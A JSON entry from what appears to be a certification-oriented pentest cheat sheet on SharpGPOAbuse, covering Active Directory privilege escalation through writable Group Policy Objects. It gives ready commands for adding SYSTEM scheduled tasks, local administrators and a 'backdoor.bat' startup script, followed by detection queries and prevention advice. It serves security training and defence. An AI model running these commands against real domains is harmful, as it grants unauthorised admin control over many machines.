@@ -1,0 +1,97 @@
+{
+  "id": "ad-sharpgpoabuse",
+  "name": "SharpGPOAbuse - GPO Privilege Escalation",
+  "command": ".\\SharpGPOAbuse.exe --AddComputerTask --TaskName \"Update\" --Author NT AUTHORITY\\SYSTEM --Command \"cmd.exe\" --Arguments \"/c net localgroup administrators <user> /add\" --GPOName \"<gpo_name>\"",
+  "description": "SharpGPOAbuse exploits write permissions on Group Policy Objects to add immediate scheduled tasks, local admin rights, or startup scripts that execute on all machines the GPO applies to. If you have GenericWrite/GenericAll on a GPO, you can compromise every machine in its scope.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "loud",
+  "category": "Active Directory",
+  "subcategory": "Privilege Escalation",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "CRTP GPO abuse module; FSecureLabs/SharpGPOAbuse",
+  "tags": [
+    "gpo",
+    "group-policy",
+    "sharpgpoabuse",
+    "privilege-escalation",
+    "scheduled-task",
+    "dacl-abuse"
+  ],
+  "mitre": [
+    "T1484.001",
+    "T1053.005"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== PREREQUISITE ===\nYou need GenericWrite, GenericAll, or WriteDacl on the GPO object.\nCheck with BloodHound or PowerView:\n  Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match \"GenericWrite|GenericAll\"}\n\n=== ADD IMMEDIATE SCHEDULED TASK ===\n  .\\SharpGPOAbuse.exe --AddComputerTask --TaskName \"Update\" --Author \"NT AUTHORITY\\SYSTEM\" --Command \"cmd.exe\" --Arguments \"/c net localgroup administrators jdoe /add\" --GPOName \"Default Domain Policy\"\n\n=== ADD LOCAL ADMIN ===\n  .\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount jdoe --GPOName \"Server Policy\"\n\n=== ADD STARTUP SCRIPT ===\n  .\\SharpGPOAbuse.exe --AddUserScript --ScriptName \"backdoor.bat\" --ScriptContents \"net localgroup administrators jdoe /add\" --GPOName \"Workstation Policy\"\n\n=== FORCE GPO UPDATE ===\n  gpupdate /force    # On target (if you have access)\n  Invoke-GPUpdate -Computer <target> -RandomDelayInMinutes 0  # Remote\n\n=== CLEANUP ===\nSharpGPOAbuse does NOT clean up. Remove the task/script manually after exploitation.",
+  "examples": [
+    {
+      "label": "Add immediate scheduled task via GPO",
+      "command": ".\\SharpGPOAbuse.exe --AddComputerTask --TaskName \"Update\" --Author \"NT AUTHORITY\\SYSTEM\" --Command \"cmd.exe\" --Arguments \"/c net localgroup administrators jdoe /add\" --GPOName \"Default Domain Policy\""
+    },
+    {
+      "label": "Add user as local admin via GPO",
+      "command": ".\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount jdoe --GPOName \"Server Policy\""
+    },
+    {
+      "label": "Force remote GPO update",
+      "command": "Invoke-GPUpdate -Computer dc01 -RandomDelayInMinutes 0"
+    }
+  ],
+  "references": [
+    {
+      "title": "SharpGPOAbuse - GitHub",
+      "url": "https://github.com/FSecureLABS/SharpGPOAbuse"
+    },
+    {
+      "title": "MITRE T1484.001 - Domain Policy Modification",
+      "url": "https://attack.mitre.org/techniques/T1484/001/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-sharpview",
+      "note": "Enumerate GPO ACLs to find writable GPOs.",
+      "rel": "prereq"
+    }
+  ],
+  "defense": {
+    "why_it_works": "GPOs are applied to all machines in scope. Write access to a GPO allows adding scheduled tasks, scripts, or group memberships that execute with SYSTEM privileges across the domain.",
+    "prerequisites": "GenericWrite/GenericAll/WriteDacl on a GPO object in Active Directory.",
+    "impact": "Local admin on all machines in the GPO scope; potential domain compromise.",
+    "detection": "[MITRE T1484.001] GPO modification events (5136); new scheduled tasks created via GPO; unexpected Group Policy changes.",
+    "artifacts": "Event 5136 (directory service changes); Event 4698 (scheduled task created); GPO version changes in SYSVOL.",
+    "splunk_spl": "index=windows EventCode=5136 ObjectClass=\"groupPolicyContainer\"\n| table _time, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, AttributeValue",
+    "elastic_kql": "event.code:\"5136\" AND winlog.event_data.ObjectClass:\"groupPolicyContainer\"",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 5136\n| where ObjectClass == \"groupPolicyContainer\"\n| project TimeGenerated, SubjectUserName, ObjectDN, AttributeLDAPDisplayName",
+    "sigma_rules": "win_security_gpo_modification_sharpgpoabuse",
+    "prevention": "Audit GPO ACLs regularly; restrict GenericWrite on GPOs; monitor SYSVOL for unexpected changes; use Advanced Audit Policy to log directory service changes.",
+    "sources": [
+      "CRTP GPO module",
+      "https://attack.mitre.org/techniques/T1484/001/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "SharpGPOAbuse - GPO modification by non-admin",
+        "logic": "SecurityEvent\n| where EventID == 5136\n| where ObjectClass == \"groupPolicyContainer\"\n| where SubjectUserName !in (\"SYSTEM\", \"Domain Admins\")\n| project TimeGenerated, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, AttributeValue",
+        "data_source": "windows-security",
+        "log_ids": [
+          "5136"
+        ],
+        "attack": [
+          "T1484.001",
+          "T1053.005"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Legitimate GPO administrators making changes",
+        "tuning": "Whitelist known GPO admin accounts; alert on any GPO change outside change windows"
+      }
+    ]
+  }
+}
